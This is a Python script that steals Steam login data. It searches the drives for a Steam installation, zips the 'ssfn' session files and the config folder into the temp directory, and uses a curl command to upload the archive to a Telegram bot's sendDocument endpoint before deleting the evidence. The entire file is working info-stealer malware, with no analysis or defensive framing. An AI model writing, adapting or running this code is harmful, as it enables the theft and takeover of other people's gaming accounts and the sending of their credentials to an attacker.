import os
import zipfile

token = "45454"
chatid = "655656"

def copy(steam_path):
    ssfn = []
    for file in os.listdir(steam_path):
        if file[:4] == "ssfn":
            ssfn.append(steam_path + "\\" + file)

    def log_write(path1, path2, log):
        for root, dirs, file_name in os.walk(path1):
            for file in file_name:
                log.write(root + "\\" + file, arcname="config\\"+file)
        for file2 in path2:
            log.write(file2, arcname=file2.split("\\")[-1])

    if os.path.exists(steam_path + "\\config") and len(ssfn) > 0:
        with zipfile.ZipFile(f"{os.environ['TEMP']}\log.zip", 'w', zipfile.ZIP_DEFLATED) as log:
            log_write(steam_path + "\\config", ssfn, log)
        os.system(
            f'curl -F document=@"{os.environ["TEMP"]}\log.zip" https://api.telegram.org/bot{token}/sendDocument?chat_id={chatid}')
        os.remove(f"{os.environ['TEMP']}\log.zip")


if token and chatid != "":
    def steam_search():
        drives = [chr(x) + ":" for x in range(65, 91) if os.path.exists(chr(x) + ":")]
        for drive in drives:
            for root,dirs,file in os.walk(drive):
                if root.find("Steam") >=1:
                    for file in os.listdir(root):
                        if file == "steam.exe":
                            return root
    steam_path = ""
    paths = [os.environ["PROGRAMFILES(X86)"]+"\\steam", os.environ["PROGRAMFILES"]+"\\steam"]
    for path_ in paths:
        if os.path.exists(path_):
            steam_path = path_
    if steam_path != "" and steam_path != None:
        copy(steam_path)
    else :
        steam_path = steam_search()
        if steam_path != "" and steam_path != None:
            copy(steam_path)

